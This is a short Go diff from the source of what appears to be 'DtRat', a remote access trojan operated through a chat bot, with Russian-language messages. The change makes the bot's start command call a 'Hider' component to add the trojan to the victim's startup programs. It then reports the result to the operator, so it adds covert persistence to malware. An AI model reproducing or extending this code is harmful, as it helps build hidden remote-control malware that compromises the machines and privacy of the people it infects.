@@ -6,8 +6,24 @@ import (
 	"os"
 )
 
+func errToStatus(err error) string {
+	if err == nil {
+		return "Успешно"
+	}
+
+	return err.Error()
+}
+
 func (r *Rat) startCmd() {
-	r.Bot.Send("Вас приветствует DtRat %s!\nвыполните /help чтобы узнать как использовать DtRat.", config.Version)
+	r.Bot.Send("Вас приветствует DtRat %s!\nвыполните /help чтобы узнать как использовать DtRat.\n\nНачата первоначальная инициализация.", config.Version)
+	err := r.Hider.AddToStartup()
+
+	doneTxt :=
+		`
+Инициализация завершена!
+Добавление в автозапуск: %s`
+
+	r.Bot.Send(doneTxt, errToStatus(err))
 }
 
 func (r *Rat) defaultCmd() {
